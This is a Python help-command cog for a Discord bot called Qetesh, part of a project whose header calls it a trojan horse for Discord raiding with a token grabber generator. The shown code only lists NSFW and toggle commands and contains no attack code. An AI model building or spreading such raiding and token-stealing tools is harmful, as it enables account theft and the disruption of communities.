"""
Discord Raidkit v2.3.4 — "The trojan horse of discord raiding"
Copyright © 2023 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

qhelp.py stores the help command for Qetesh.
qhelp.py was last updated on 05/03/23 at 20:51 UTC.
"""

import logging

import discord
from discord import app_commands
from discord.ext import commands

from utils import init_logger

init_logger()


class Help(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot
        return

    @app_commands.command(
        name='help',
        description='Displays the help command.')
    async def help(self, interaction: discord.Interaction) -> None:
        try:
            await interaction.response.defer(ephemeral=True)
            embed = discord.Embed(
                title='Commands',
                color=discord.Color.gold())

            embed.add_field(
                name='see', value='see some porn ;)', inline=True)
            embed.add_field(
                name='toggle-cmd', value='toggle whether a command is enabled', inline=True)
            embed.add_field(name='toggle-only-nsfw',
                            value='toggle whether NSFW commands are restricted to NSFW channels', inline=True)

            await interaction.followup.send(embed=embed)

        except discord.errors.Forbidden:
            embed = discord.Embed(
                title='Action Forbidden',
                description='I do not have the required permissions to send embeds to this channel.',
                color=discord.Color.brand_red())
            await interaction.followup.send(embed=embed)

        except Exception as e:
            logging.error(
                f'Error in qhelp.py - help(): {e}')
            await interaction.followup.send(f'Error: {e}')

        return


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Help(bot))
